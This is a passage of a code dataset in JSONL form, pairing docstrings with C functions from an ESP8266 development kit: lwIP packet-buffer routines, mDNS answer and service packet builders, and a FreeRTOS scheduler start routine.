LWIP_DBG_LEVEL_SERIOUS,\n        (\"pbuf_header: failed as %p < %p (not enough space for new header size)\\n\",\n        (void *)p->payload, (void *)(p + 1)));\n      /* restore old payload pointer */\n      p->payload = payload;\n      /* bail out unsuccesfully */\n      return 1;\n    }\n  /* pbuf types refering to external payloads? */\n  } else if (type == PBUF_REF || type == PBUF_ROM) {\n    /* hide a header in the payload? */\n    if ((header_size_increment < 0) && (increment_magnitude <= p->len)) {\n      /* increase payload pointer */\n      p->payload = (u8_t *)p->payload - header_size_increment;\n    } else {\n      /* cannot expand payload to front (yet!)\n       * bail out unsuccesfully */\n      if (type == PBUF_REF) {\n    \t  /* increase payload pointer */\n        p->payload = (u8_t *)p->payload - header_size_increment;\n      } else {\n        return 1;\n      }\n    }\n  } else {\n    /* Unknown type */\n    LWIP_ASSERT(\"bad pbuf type\", 0);\n    return 1;\n  }\n  /* modify pbuf length fields */\n  p->len += header_size_increment;\n  p->tot_len += header_size_increment;\n\n  LWIP_DEBUGF(PBUF_DEBUG | LWIP_DBG_TRACE, (\"pbuf_header: old %p new %p (%\"S16_F\")\\n\",\n    (void *)payload, (void *)p->payload, header_size_increment));\n\n  return 0;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Attempt to reclaim some memory from queued out-of-sequence TCP segments\n * if we run out of pool pbufs. It's better to give priority to new packets\n * if we're running out.\n *\n * This must be done in the correct thread context therefore this function\n * can only be used with NO_SYS=0 and through tcpip_callback.\n */\n", "func_signal": "static void ICACHE_FLASH_ATTR\npbuf_free_ooseq(void* arg)", "code": "{\n  struct tcp_pcb* pcb;\n  SYS_ARCH_DECL_PROTECT(old_level);\n  LWIP_UNUSED_ARG(arg);\n\n  SYS_ARCH_PROTECT(old_level);\n  pbuf_free_ooseq_queued = 0;\n  SYS_ARCH_UNPROTECT(old_level);\n\n  for (pcb = tcp_active_pcbs; NULL != pcb; pcb = pcb->next) {\n    if (NULL != pcb->ooseq) {\n      /** Free the ooseq pbufs of one PCB only */\n      LWIP_DEBUGF(PBUF_DEBUG | LWIP_DBG_TRACE, (\"pbuf_free_ooseq: freeing out-of-sequence pbufs\\n\"));\n      tcp_segs_free(pcb->ooseq);\n      pcb->ooseq = NULL;\n      return;\n    }\n  }\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/* DNS_DOES_NAME_CHECK */\n/**\n * Send a mDNS answer packet.\n *\n * @param type of answer hostname and service registration or service\n * @param name to query\n * @param id transaction ID in the DNS query packet\n * @return ERR_OK if packet is sent; an err_t indicating the problem otherwise\n */\n", "func_signal": "static err_t ICACHE_FLASH_ATTR\nmdns_answer(u16_t type, const char* name, u8_t id)", "code": "{\n\terr_t err;\n\tstruct mdns_hdr *hdr;\n\tstruct mdns_answer ans;\n\tstruct mdns_auth auth;\n\tstruct mdns_service serv;\n\tstruct pbuf *p ,*p_sta;\n\tchar *query, *nptr;\n\tconst char *pHostname;\n\tstruct netif * sta_netif = NULL;\n\tstruct netif * ap_netif = NULL;\n\tstatic char tmpBuf[PUCK_DATASHEET_SIZE + PUCK_SERVICE_LENGTH];\n\tu8_t n;\n\tu16_t length = 0;\n\t/* if here, we have either a new query or a retry on a previous query to process */\n\tp = pbuf_alloc(PBUF_TRANSPORT,\n\t\t\tSIZEOF_DNS_HDR + MDNS_MAX_NAME_LENGTH * 2 + SIZEOF_DNS_QUERY, PBUF_RAM);\n\tif (p != NULL) {\n\t\tLWIP_ASSERT(\"pbuf must be in one piece\", p->next == NULL);\n\t\t/* fill dns header */\n\t\thdr = (struct mdns_hdr*) p->payload;\n\t\tos_memset(hdr, 0, SIZEOF_DNS_HDR);\n\t\thdr->id = htons(id);\n\t\thdr->flags1 = DNS_FLAG1_RESPONSE;\n\n\t\tif (type == MDNS_SD_ANSWER) {\n\t\t\tpHostname = DNS_SD_SERVICE;\n\t\t\thdr->numanswers = htons(1);\n\t\t} else if (type == MDNS_SERVICE_REG_ANSWER) {\n\t\t\tpHostname = PUCK_SERVICE;\n\t\t\thdr->numanswers = htons(type);\n\t\t} else {\n\t\t\tpHostname = name;\n\t\t\thdr->numanswers = htons(type);\n\t\t}\n\t\tquery = (char*) hdr + SIZEOF_DNS_HDR;\n\t\t--pHostname;\n\t\t/* convert hostname into suitable query format. */\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t*query++ = '\\0';\n\t\t/* fill dns query */\n\n\t\tif (type == MDNS_REG_ANSWER) {\n\n\t\t\tans.type = htons(DNS_RRTYPE_A);\n\t\t\tans.class = htons(DNS_RRCLASS_IN);\n\t\t\tans.ttl = htonl(MDNS_SERVICE_TIME);\n\t\t\tans.len = htons(DNS_IP_ADDR_LEN);\n\t\t\tlength = DNS_IP_ADDR_LEN;\n\n\t\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\t\t/* set the local IP address */\n\t\t\tauth.src = host_addr.addr;\n\t\t\tMEMCPY( query, &auth, SIZEOF_MDNS_AUTH);\n\t\t}\n\t\tif (type == MDNS_SD_ANSWER) {\n\n\t\t\tans.type = htons(DNS_RRTYPE_PTR);\n\t\t\tans.class = htons(DNS_RRCLASS_IN);\n\t\t\tans.ttl = htonl(300);\n\t\t\tans.len = htons(os_strlen(PUCK_SERVICE) + 1 +1 );\n\t\t\tlength = 0;\n\n\t\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_DNS_ANSWER;\n\t\t\tpHostname = PUCK_SERVICE;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\t\t\t*query++ = '\\0';\n\t\t}\n\n\t\tif (type == MDNS_SERVICE_REG_ANSWER) {\n\n\t\t\tans.type = htons(DNS_RRTYPE_PTR);\n\t\t\tans.class = htons(DNS_RRCLASS_IN);\n\t\t\tans.ttl = htonl(MDNS_SERVICE_TIME);\n\t\t\tos_strcpy(tmpBuf, name);\n\t\t\tos_strcat(tmpBuf, \".\");\n\t\t\tos_strcat(tmpBuf, PUCK_SERVICE);\n\n\t\t\tlength = os_strlen(tmpBuf) + MDNS_LENGTH_ADD;\n\t\t\tans.len = htons(length);\n\t\t\tlength = 0;\n\n\t\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\t\tpHostname = tmpBuf;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\t\t\t*query++ = '\\0';\n\n\t\t\t/* Service query*/\n\t\t\tpHostname = name;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\n\t\t\t/* Add to the service name the service local\n\t\t\t * pointing to the beginning of the mDNS message*/\n\t\t\t*query++ = DNS_OFFSET_FLAG;\n\t\t\t*query++ = DNS_DEFAULT_OFFSET;\n\n\t\t\t/* fill the query */\n\n\t\t\tans.type = htons(DNS_RRTYPE_SRV);\n\t\t\tans.class = htons(DNS_RRCLASS_FLUSH_IN);\n\t\t\tans.ttl = htonl(MDNS_SERVICE_TIME);\n\t\t\tos_strcpy(tmpBuf, host_name);\n\t\t\tos_strcat(tmpBuf, \".\");\n\t\t\tos_strcat(tmpBuf, MDNS_LOCAL);\n\t\t\tlength = os_strlen(tmpBuf) + MDNS_LENGTH_ADD;\n\t\t\tans.len = htons(SIZEOF_MDNS_SERVICE + length);\n\t\t\tlength = 0;\n\t\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_DNS_ANSWER;\n\t\t\t/* fill the service properties */\n\n\t\t\tserv.prior = htons(0);\n\t\t\tserv.weight = htons(0);\n\t\t\tserv.port = htons(PUCK_PORT);\n\t\t\tMEMCPY( query, &serv, SIZEOF_MDNS_SERVICE);\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_MDNS_SERVICE;\n\n\t\t\tpHostname = tmpBuf;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\t\t\t*query++ = '\\0';\n\n\t\t\t/* TXT answer */\n\t\t\tpHostname = name;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\n\t\t\t/* Add to the service name the service local\n\t\t\t * pointing to the beginning of the mDNS message*/\n\t\t\t*query++ = DNS_OFFSET_FLAG;\n\t\t\t*query++ = DNS_DEFAULT_OFFSET;\n\n\t\t\t/* fill the answer */\n\t\t\tans.type = htons(DNS_RRTYPE_TXT);\n\t\t\tans.class = htons(DNS_RRCLASS_IN);\n\t\t\tans.ttl = htonl(MDNS_SERVICE_TIME);\n\t\t\tlength = sizeof(SERVICE_DESCRIPTION);\n\t\t\tans.len = htons(length);\n\t\t\tlength = 0;\n\t\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\n\t\t\t/* resize the query */\n\t\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\t\tpHostname = SERVICE_DESCRIPTION;\n\t\t\t--pHostname;\n\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\t\t\t*query++ = '\\0';\n\t\t}\n\t\t/* resize pbuf to the exact dns query */\n\t\tpbuf_realloc(p, (query + length) - ((char*) (p->payload)));\n\n\t\t/* send dns packet */\n\t\t/*add by tzx for AP + STA MDNS begin------*/\n\t\tsta_netif = (struct netif *)eagle_lwip_getif(0x00);\n\t\tap_netif =  (struct netif *)eagle_lwip_getif(0x01);\n\t\tif(wifi_get_opmode() == 0x03 && wifi_get_broadcast_if() == 0x03 &&\\\n\t\t\t\tsta_netif != NULL && ap_netif != NULL) {\n\t\t\tif(netif_is_up(sta_netif) && netif_is_up(ap_netif)) {\n\n\t\t\t\tp_sta = pbuf_alloc(PBUF_TRANSPORT,\n\t\t\t\t\t\t\tSIZEOF_DNS_HDR + MDNS_MAX_NAME_LENGTH * 2 + SIZEOF_DNS_QUERY, PBUF_RAM);\n\t\t\t  if (pbuf_copy (p_sta,p) != ERR_OK) {\n\t\t\t\t  os_printf(\"mdns_answer copying to new pbuf failed\\n\");\n\t\t\t\t  return -1;\n\t\t\t  }\n\t\t\t  netif_set_default(sta_netif);\n\t\t\t  err = udp_sendto(mdns_pcb, p_sta, &multicast_addr, DNS_MDNS_PORT);\n\t\t\t  pbuf_free(p_sta);\n\t\t\t  netif_set_default(ap_netif);\n\t\t\t}\n\t\t}\n\t\t/*add by tzx for AP + STA MDNS end------*/\n\t\terr = udp_sendto(mdns_pcb, p, &multicast_addr, DNS_MDNS_PORT);\n\t\t/* free pbuf */\n\t\tpbuf_free(p);\n\t} else {\n\t\terr = ERR_MEM;\n\t}\n\n\treturn err;\n}", "path": "Espressif\\examples\\ESP8266\\lwip_open_demo_app\\app\\lwip\\core\\mdns.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/** Compare pbuf contents at specified offset with memory s2, both of length n\n *\n * @param p pbuf to compare\n * @param offset offset into p at wich to start comparing\n * @param s2 buffer to compare\n * @param n length of buffer to compare\n * @return zero if equal, nonzero otherwise\n *         (0xffff if p is too short, diffoffset+1 otherwise)\n */\n", "func_signal": "u16_t\npbuf_memcmp(struct pbuf* p, u16_t offset, const void* s2, u16_t n)", "code": "{\n  u16_t start = offset;\n  struct pbuf* q = p;\n\n  /* get the correct pbuf */\n  while ((q != NULL) && (q->len <= start)) {\n    start -= q->len;\n    q = q->next;\n  }\n  /* return requested data if pbuf is OK */\n  if ((q != NULL) && (q->len > start)) {\n    u16_t i;\n    for(i = 0; i < n; i++) {\n      u8_t a = pbuf_get_at(q, start + i);\n      u8_t b = ((u8_t*)s2)[i];\n      if (a != b) {\n        return i+1;\n      }\n    }\n    return 0;\n  }\n  return 0xffff;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * close the UDP pcb .\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\nmdns_close(void)", "code": "{\n\tuint8 text_index = 0;\n\tif (mdns_pcb != NULL && ms_info != NULL) {\n\t\tudp_remove(mdns_pcb);\n\t\tfor(text_index = 0;text_index < 10;text_index++) {\n\t\t\t\tif(ms_info->txt_data[text_index] != NULL) {\n\t\t\t\t\tos_free(ms_info->txt_data[text_index]);\n\t\t\t\t\tms_info->txt_data[text_index] = NULL;\n\t\t\t\t}\n\t\t}\n\t\tif (ms_info->host_name != NULL) {\n\t\t\tos_free(ms_info->host_name);\n\t\t\tms_info->host_name = NULL;\n\t\t}\n\t\tif (ms_info->server_name != NULL) {\n\t\t\tos_free(ms_info->server_name);\n\t\t\tms_info->server_name = NULL;\n\t\t}\n\t\tos_free(ms_info);\n\t\tmdns_pcb = NULL;\n\t\tms_info = NULL;\n\t}\n}", "path": "Espressif\\examples\\ESP8266\\lwip_open_demo_app\\app\\lwip\\core\\mdns.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Count number of pbufs in a chain\n *\n * @param p first pbuf of chain\n * @return the number of pbufs in a chain\n */\n", "func_signal": "u8_t\npbuf_clen(struct pbuf *p)", "code": "{\n  u8_t len;\n\n  len = 0;\n  while (p != NULL) {\n    ++len;\n    p = p->next;\n  }\n  return len;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Dechains the first pbuf from its succeeding pbufs in the chain.\n *\n * Makes p->tot_len field equal to p->len.\n * @param p pbuf to dechain\n * @return remainder of the pbuf chain, or NULL if it was de-allocated.\n * @note May not be called on a packet queue.\n */\n", "func_signal": "struct pbuf *\npbuf_dechain(struct pbuf *p)", "code": "{\n  struct pbuf *q;\n  u8_t tail_gone = 1;\n  /* tail */\n  q = p->next;\n  /* pbuf has successor in chain? */\n  if (q != NULL) {\n    /* assert tot_len invariant: (p->tot_len == p->len + (p->next? p->next->tot_len: 0) */\n    LWIP_ASSERT(\"p->tot_len == p->len + q->tot_len\", q->tot_len == p->tot_len - p->len);\n    /* enforce invariant if assertion is disabled */\n    q->tot_len = p->tot_len - p->len;\n    /* decouple pbuf from remainder */\n    p->next = NULL;\n    /* total length of pbuf p is its own length only */\n    p->tot_len = p->len;\n    /* q is no longer referenced by p, free it */\n    LWIP_DEBUGF(PBUF_DEBUG | LWIP_DBG_TRACE, (\"pbuf_dechain: unreferencing %p\\n\", (void *)q));\n    tail_gone = pbuf_free(q);\n    if (tail_gone > 0) {\n      LWIP_DEBUGF(PBUF_DEBUG | LWIP_DBG_TRACE,\n                  (\"pbuf_dechain: deallocated %p (as it is no longer referenced)\\n\", (void *)q));\n    }\n    /* return remaining tail or NULL if deallocated */\n  }\n  /* assert tot_len invariant: (p->tot_len == p->len + (p->next? p->next->tot_len: 0) */\n  LWIP_ASSERT(\"p->tot_len == p->len\", p->tot_len == p->len);\n  return ((tail_gone > 0) ? NULL : q);\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Copies data into a single pbuf (*not* into a pbuf queue!) and updates\n * the checksum while copying\n *\n * @param p the pbuf to copy data into\n * @param start_offset offset of p->payload where to copy the data to\n * @param dataptr data to copy into the pbuf\n * @param len length of data to copy into the pbuf\n * @param chksum pointer to the checksum which is updated\n * @return ERR_OK if successful, another error if the data does not fit\n *         within the (first) pbuf (no pbuf queues!)\n */\n", "func_signal": "err_t\npbuf_fill_chksum(struct pbuf *p, u16_t start_offset, const void *dataptr,\n                 u16_t len, u16_t *chksum)", "code": "{\n  u32_t acc;\n  u16_t copy_chksum;\n  char *dst_ptr;\n  LWIP_ASSERT(\"p != NULL\", p != NULL);\n  LWIP_ASSERT(\"dataptr != NULL\", dataptr != NULL);\n  LWIP_ASSERT(\"chksum != NULL\", chksum != NULL);\n  LWIP_ASSERT(\"len != 0\", len != 0);\n\n  if ((start_offset >= p->len) || (start_offset + len > p->len)) {\n    return ERR_ARG;\n  }\n\n  dst_ptr = ((char*)p->payload) + start_offset;\n  copy_chksum = LWIP_CHKSUM_COPY(dst_ptr, dataptr, len);\n  if ((start_offset & 1) != 0) {\n    copy_chksum = SWAP_BYTES_IN_WORD(copy_chksum);\n  }\n  acc = *chksum;\n  acc += copy_chksum;\n  *chksum = FOLD_U32T(acc);\n  return ERR_OK;\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Concatenate two pbufs (each may be a pbuf chain) and take over\n * the caller's reference of the tail pbuf.\n * \n * @note The caller MAY NOT reference the tail pbuf afterwards.\n * Use pbuf_chain() for that purpose.\n * \n * @see pbuf_chain()\n */\n", "func_signal": "void\npbuf_cat(struct pbuf *h, struct pbuf *t)", "code": "{\n  struct pbuf *p;\n\n  LWIP_ERROR(\"(h != NULL) && (t != NULL) (programmer violates API)\",\n             ((h != NULL) && (t != NULL)), return;);\n\n  /* proceed to last pbuf of chain */\n  for (p = h; p->next != NULL; p = p->next) {\n    /* add total length of second chain to all totals of first chain */\n    p->tot_len += t->tot_len;\n  }\n  /* { p is last pbuf of first h chain, p->next == NULL } */\n  LWIP_ASSERT(\"p->tot_len == p->len (of last pbuf in chain)\", p->tot_len == p->len);\n  LWIP_ASSERT(\"p->next == NULL\", p->next == NULL);\n  /* add total length of second chain to last pbuf total of first chain */\n  p->tot_len += t->tot_len;\n  /* chain last pbuf of head (p) with first of tail (t) */\n  p->next = t;\n  /* p->next now references t, but the caller will drop its reference to t,\n   * so netto there is no change to the reference count of t.\n   */\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Chain two pbufs (or pbuf chains) together.\n * \n * The caller MUST call pbuf_free(t) once it has stopped\n * using it. Use pbuf_cat() instead if you no longer use t.\n * \n * @param h head pbuf (chain)\n * @param t tail pbuf (chain)\n * @note The pbufs MUST belong to the same packet.\n * @note MAY NOT be called on a packet queue.\n *\n * The ->tot_len fields of all pbufs of the head chain are adjusted.\n * The ->next field of the last pbuf of the head chain is adjusted.\n * The ->ref field of the first pbuf of the tail chain is adjusted.\n *\n */\n", "func_signal": "void\npbuf_chain(struct pbuf *h, struct pbuf *t)", "code": "{\n  pbuf_cat(h, t);\n  /* t is now referenced by h */\n  pbuf_ref(t);\n  LWIP_DEBUGF(PBUF_DEBUG | LWIP_DBG_TRACE, (\"pbuf_chain: %p references %p\\n\", (void *)h, (void *)t));\n}", "path": "Espressif\\ESP8266_SDK\\third_party\\lwip\\core\\pbuf.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/*\n * See header file for description.\n */\n", "func_signal": "portBASE_TYPE ICACHE_FLASH_ATTR\nxPortStartScheduler( void )", "code": "{\n\t//set pendsv and systemtick as lowest priority ISR.\n\t//pendsv setting\n\t\t\t/*******GPIO sdio_clk isr*********/\n#if 0\n    _xt_isr_attach(ETS_GPIO_INUM, GPIOIntrHdl, NULL);\n    _xt_isr_unmask(1<<ETS_GPIO_INUM);\n#else\n\t\t\t/*******software isr*********/\n   \t_xt_isr_attach(ETS_SOFT_INUM, SoftIsrHdl, NULL);\n    _xt_isr_unmask(1<<ETS_SOFT_INUM);\n#endif\n\n    /* Initialize system tick timer interrupt and schedule the first tick. */\n    _xt_tick_timer_init();\n\n//    os_printf(\"xPortStartScheduler\\n\");\n    vTaskSwitchContext();\n\n//    REG_SET_BIT(0x3ff2006c, BIT(4));\n\t/* Restore the context of the first task that is going to run. */\n\n\tXT_RTOS_INT_EXIT();\n\n\t/* Should not get here as the tasks are now running! */\n\treturn pdTRUE;\n}", "path": "Espressif\\ESP8266_RTOS_SDK\\third_party\\freertos\\port.c", "repo_name": "CHERTS/esp8266-devkit", "stars": 262, "license": "gpl-3.0", "language": "c", "size": 135868}
{"docstring": "/**\n * Send a mDNS service answer packet.\n *\n * @param name service name to query\n * @param id transaction ID in the DNS query packet\n * @return ERR_OK if packet is sent; an err_t indicating the problem otherwise\n */\n", "func_signal": "static err_t ICACHE_FLASH_ATTR\nmdns_send_service(struct mdns_info *info, u8_t id)", "code": "{\n\terr_t err;\n\tstruct mdns_hdr *hdr;\n\tstruct mdns_answer ans;\n\tstruct mdns_service serv;\n\tstruct mdns_auth auth;\n\tstruct pbuf *p ,*p_sta;\n\tchar *query, *nptr;\n\tconst char *pHostname;\n\tchar *device_info;\n\tconst char *name = info->host_name;\n\tu8_t n;\n\tu8_t i = 0;\n\tu16_t length = 0;\n\tu8_t addr1 = 12, addr2 = 12;\n\tstruct netif * sta_netif = NULL;\n\tstruct netif * ap_netif = NULL;\n\tstatic char tmpBuf[PUCK_DATASHEET_SIZE + PUCK_SERVICE_LENGTH];\n\t/* if here, we have either a new query or a retry on a previous query to process */\n\tp = pbuf_alloc(PBUF_TRANSPORT,\n\t\t\tSIZEOF_DNS_HDR + MDNS_MAX_NAME_LENGTH * 2 + SIZEOF_DNS_QUERY, PBUF_RAM);\n\tif (p != NULL) {\n\t\tLWIP_ASSERT(\"pbuf must be in one piece\", p->next == NULL);\n\t\t/* fill dns header */\n\t\thdr = (struct mdns_hdr*) p->payload;\n\t\tos_memset(hdr, 0, SIZEOF_DNS_HDR);\n\t\thdr->id = htons(id);\n\t\thdr->flags1 = DNS_FLAG1_RESPONSE;\n\t\thdr->numanswers = htons(4);\n\t\tquery = (char*) hdr + SIZEOF_DNS_HDR;\n\t\tos_strcpy(tmpBuf, PUCK_SERVICE);\n\n\t\tpHostname = tmpBuf;\n\t\t--pHostname;\n\n\t\t/* convert hostname into suitable query format. */\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\t++addr1;\n\t\t\t++addr2;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++addr1;\n\t\t\t\t++addr2;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t*query++ = '\\0';\n\t\tlength = sizeof(MDNS_LOCAL);\n\t\taddr1 -= length;\n\t\tlength = os_strlen(PUCK_SERVICE) + 1;\n\t\taddr2 -= length;\n\n\t\tans.type = htons(DNS_RRTYPE_PTR);\n\t\tans.class = htons(DNS_RRCLASS_IN);\n\t\tans.ttl = htonl(300);\n\t\tos_strcpy(tmpBuf, name);\n\t\tlength = os_strlen(tmpBuf) + MDNS_LENGTH_ADD + 1;\n\t\tans.len = htons(length);\n\t\tlength = 0;\n\n\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\t\t/* resize the query */\n\t\tquery = query + SIZEOF_DNS_ANSWER;\n\n\t\tpHostname = tmpBuf;\n\t\t--pHostname;\n\t\t/* convert hostname into suitable query format. */\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t*query++ = DNS_OFFSET_FLAG;\n\t\t*query++ = DNS_DEFAULT_OFFSET;\n\t\tpHostname = name;\n\t\t--pHostname;\n\t\t/* convert hostname into suitable query format. */\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\t//*query++ = '\\0';\n\t\t*query++ = DNS_OFFSET_FLAG;\n\t\t*query++ = DNS_DEFAULT_OFFSET;\n\n\t\t/* fill the answer */\n\t\tans.type = htons(DNS_RRTYPE_TXT);\n\t\tans.class = htons(DNS_RRCLASS_FLUSH_IN);\n\t\tans.ttl = htonl(300);\n//\t\tlength = os_strlen(TXT_DATA) + MDNS_LENGTH_ADD + 1;\n\t\tdevice_info = (char *)os_zalloc(50);\n\t\tets_sprintf(device_info,\"vendor = %s\",\"Espressif\");\n\t\tfor(i = 0; i < 10 &&(info->txt_data[i] != NULL);i++) {\n\t\t\tlength += os_strlen(info->txt_data[i]);\n\t\t\tlength++;\n\t\t}\n\t\tlength += os_strlen(device_info)+ 1 ;\n\t\tans.len = htons(length);\n\t\tlength = 0;\n\t\tMEMCPY( query, &ans, SIZEOF_DNS_ANSWER);\n\t\tquery = query + SIZEOF_DNS_ANSWER;\n\t\tpHostname = device_info;\n\t\t--pHostname;\n\t\t/* convert hostname into suitable query format. */\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0;  *pHostname != 0; ++pHostname) {\n\t\t\t\t*query = *pHostname;\n\t\t\t\t++query;\n\t\t\t\t++n;\n\t\t\t}\n\t\t\t*nptr = n;\n\t\t} while (*pHostname != 0);\n\t\ti = 0;\n\t\twhile(info->txt_data[i] != NULL && i < 10) {\n\t\t\tpHostname = info->txt_data[i];\n\t\t\t--pHostname;\n\t\t\t/* convert hostname into suitable query format. */\n\t\t\tdo {\n\t\t\t\t++pHostname;\n\t\t\t\tnptr = query;\n\t\t\t\t++query;\n\t\t\t\tfor (n = 0;  *pHostname != 0; ++pHostname) {\n\t\t\t\t\t*query = *pHostname;\n\t\t\t\t\t++query;\n\t\t\t\t\t++n;\n\t\t\t\t}\n\t\t\t\t*nptr = n;\n\t\t\t} while (*pHostname != 0);\n\t\t\ti++;\n\t\t}\n//\t\t*query++ = '\\0';\n\t\tos_free(device_info);\n\t\tos_strcpy(tmpBuf, name);\n\t\tpHostname = tmpBuf;\n\t\t--pHostname;\n\t\tdo {\n\t\t\t++pHostname;\n\t\t\tnptr = query;\n\t\t\t++query;\n\t\t\tfor (n = 0; *pHostname != '.' && 